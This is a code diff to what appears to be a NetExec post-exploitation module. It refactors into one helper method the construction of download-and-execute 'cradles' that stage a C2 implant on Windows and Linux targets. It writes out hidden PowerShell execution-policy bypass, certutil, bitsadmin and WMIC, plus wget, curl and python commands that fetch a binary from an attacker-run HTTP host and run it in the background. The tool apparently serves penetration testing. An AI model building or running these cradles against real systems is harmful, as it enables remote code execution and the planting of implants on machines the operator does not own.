@@ -1289,6 +1289,86 @@ class NXCModule:
         """Wrap a command in WMIC for async fire-and-forget execution."""
         return f'WMIC process call create "cmd /c {inner_cmd}"'
 
+    def _build_download_cradle(self, os_type, download_url, implant_name, protocol=None):
+        """
+        Build download cradle command for the specified OS and staging method.
+        
+        Args:
+            os_type: Target OS (windows/linux)
+            download_url: HTTP URL to download implant from
+            implant_name: Name of the implant file
+            protocol: Protocol being used (affects command format for SMB)
+        
+        Returns:
+            str: Command to execute on target
+        
+        Raises:
+            ValueError: If staging method not supported for OS
+        """
+        is_windows = os_type.lower() == "windows"
+        
+        if is_windows:
+            # Windows staging methods
+            if self.staging_method == "powershell":
+                # PowerShell Invoke-WebRequest download + execute
+                # SMB requires 'cmd /c' wrapper for PowerShell
+                if protocol and protocol.lower() == "smb":
+                    cmd = (
+                        f'cmd /c powershell -ep bypass -w hidden -c '
+                        f'"IWR \'{download_url}\' -OutFile $env:TEMP\\{implant_name}; '
+                        f'Start-Process $env:TEMP\\{implant_name}"'
+                    )
+                else:
+                    cmd = (
+                        f'powershell -ep bypass -w hidden -c '
+                        f'"IWR \'{download_url}\' -OutFile $env:TEMP\\{implant_name}; '
+                        f'Start-Process $env:TEMP\\{implant_name}"'
+                    )
+            elif self.staging_method == "certutil":
+                # Certutil download + execute with WMIC for true async
+                cmd = self._build_wmic_command(
+                    f'certutil -urlcache -f {download_url} '
+                    f'%TEMP%\\{implant_name} && %TEMP%\\{implant_name}'
+                )
+            elif self.staging_method == "bitsadmin":
+                # BITSAdmin download + execute with WMIC for true async
+                cmd = self._build_wmic_command(
+                    f'bitsadmin /transfer job /download /priority high '
+                    f'{download_url} %TEMP%\\{implant_name} && %TEMP%\\{implant_name}'
+                )
+            else:
+                raise ValueError(f"Staging method '{self.staging_method}' not supported for Windows. Use: powershell, certutil, or bitsadmin")
+        else:
+            # Linux staging methods
+            tmp_path = f"/tmp/{implant_name}"
+            
+            if self.staging_method == "wget":
+                # wget download + execute in background
+                cmd = (
+                    f'wget -q -O {tmp_path} {download_url} && '
+                    f'chmod +x {tmp_path} && '
+                    f'nohup {tmp_path} > /dev/null 2>&1 &'
+                )
+            elif self.staging_method == "curl":
+                # curl download + execute in background
+                cmd = (
+                    f'curl -s -o {tmp_path} {download_url} && '
+                    f'chmod +x {tmp_path} && '
+                    f'nohup {tmp_path} > /dev/null 2>&1 &'
+                )
+            elif self.staging_method == "python":
+                # Python urllib download + execute in background
+                cmd = (
+                    f'python3 -c "import urllib.request; '
+                    f'urllib.request.urlretrieve(\'{download_url}\', \'{tmp_path}\')" && '
+                    f'chmod +x {tmp_path} && '
+                    f'nohup {tmp_path} > /dev/null 2>&1 &'
+                )
+            else:
+                raise ValueError(f"Staging method '{self.staging_method}' not supported for Linux. Use: wget, curl, or python")
+        
+        return cmd
+
     def _run_beacon_staged_http(self, context, connection, os_type, arch, implant_name, handler):
         """
         Execute beacon via HTTP download staging.
@@ -1359,72 +1439,13 @@ class NXCModule:
         # 4. Build download cradle based on OS type and staging method
         download_url = f"http://{stager_host}:{stager_port}{implant_path}"
         
-        # Determine if this is a Windows or Linux target
-        is_windows = os_type.lower() == "windows"
-        
-        if is_windows:
-            # Windows staging methods
-            if self.staging_method == "powershell":
-                # PowerShell Invoke-WebRequest download + execute
-                cmd = (
-                    f'powershell -ep bypass -w hidden -c '
-                    f'"IWR \'{download_url}\' -OutFile $env:TEMP\\{implant_name}; '
-                    f'Start-Process $env:TEMP\\{implant_name}"'
-                )
-                context.log.debug("Using PowerShell staging method")
-            elif self.staging_method == "certutil":
-                # Certutil download + execute with WMIC for true async
-                # WMIC process call create is fire-and-forget - returns immediately
-                # Entire download+execute chain is wrapped in WMIC to prevent xp_cmdshell blocking
-                cmd = self._build_wmic_command(
-                    f'certutil -urlcache -f {download_url} '
-                    f'%TEMP%\\{implant_name} && %TEMP%\\{implant_name}'
-                )
-                context.log.debug("Using certutil staging method")
-            elif self.staging_method == "bitsadmin":
-                # BITSAdmin download + execute with WMIC for true async
-                # WMIC process call create is fire-and-forget - returns immediately
-                # Entire download+execute chain is wrapped in WMIC to prevent xp_cmdshell blocking
-                cmd = self._build_wmic_command(
-                    f'bitsadmin /transfer job /download /priority high '
-                    f'{download_url} %TEMP%\\{implant_name} && %TEMP%\\{implant_name}'
-                )
-                context.log.debug("Using bitsadmin staging method")
-            else:
-                context.log.fail(f"Staging method '{self.staging_method}' not supported for Windows. Use: powershell, certutil, or bitsadmin")
-                sys.exit(1)
-        else:
-            # Linux staging methods
-            tmp_path = f"/tmp/{implant_name}"
-            
-            if self.staging_method == "wget":
-                # wget download + execute in background
-                cmd = (
-                    f'wget -q -O {tmp_path} {download_url} && '
-                    f'chmod +x {tmp_path} && '
-                    f'nohup {tmp_path} > /dev/null 2>&1 &'
-                )
-                context.log.debug("Using wget staging method")
-            elif self.staging_method == "curl":
-                # curl download + execute in background
-                cmd = (
-                    f'curl -s -o {tmp_path} {download_url} && '
-                    f'chmod +x {tmp_path} && '
-                    f'nohup {tmp_path} > /dev/null 2>&1 &'
-                )
-                context.log.debug("Using curl staging method")
-            elif self.staging_method == "python":
-                # Python urllib download + execute in background
-                cmd = (
-                    f'python3 -c "import urllib.request; '
-                    f'urllib.request.urlretrieve(\'{download_url}\', \'{tmp_path}\')" && '
-                    f'chmod +x {tmp_path} && '
-                    f'nohup {tmp_path} > /dev/null 2>&1 &'
-                )
-                context.log.debug("Using python staging method")
-            else:
-                context.log.fail(f"Staging method '{self.staging_method}' not supported for Linux. Use: wget, curl, or python")
-                sys.exit(1)
+        # Build download cradle command based on OS and staging method
+        try:
+            cmd = self._build_download_cradle(os_type, download_url, implant_name, protocol)
+            context.log.debug(f"Using {self.staging_method} staging method")
+        except ValueError as e:
+            context.log.fail(str(e))
+            sys.exit(1)
         
         context.log.info(f"Payload size: {len(cmd)} bytes")
         
@@ -1484,30 +1505,11 @@ class NXCModule:
                 sys.exit(1)
             
             # Build command based on download tool
-            if self.staging_method == "powershell":
-                # PowerShell with Start-Process for async execution
-                cmd = (
-                    f'cmd /c powershell -ep bypass -w hidden -c '
-                    f'"IWR \'{download_url}\' -OutFile $env:TEMP\\{implant_name}; '
-                    f'Start-Process $env:TEMP\\{implant_name}"'
-                )
-                context.log.debug("Using PowerShell staging method via SMB")
-            elif self.staging_method == "certutil":
-                # Certutil with WMIC wrapper for async (same pattern as MSSQL)
-                cmd = self._build_wmic_command(
-                    f'certutil -urlcache -f {download_url} '
-                    f'%TEMP%\\{implant_name} && %TEMP%\\{implant_name}'
-                )
-                context.log.debug("Using certutil staging method via SMB")
-            elif self.staging_method == "bitsadmin":
-                # Bitsadmin with WMIC wrapper for async (same pattern as MSSQL)
-                cmd = self._build_wmic_command(
-                    f'bitsadmin /transfer job /download /priority high '
-                    f'{download_url} %TEMP%\\{implant_name} && %TEMP%\\{implant_name}'
-                )
-                context.log.debug("Using bitsadmin staging method via SMB")
-            else:
-                context.log.fail(f"Download tool '{self.staging_method}' not supported for SMB. Use: powershell, certutil, or bitsadmin")
+            try:
+                cmd = self._build_download_cradle(os_type, download_url, implant_name, protocol="smb")
+                context.log.debug(f"Using {self.staging_method} staging method via SMB")
+            except ValueError as e:
+                context.log.fail(str(e))
                 sys.exit(1)
             
             # Execute via smbexec
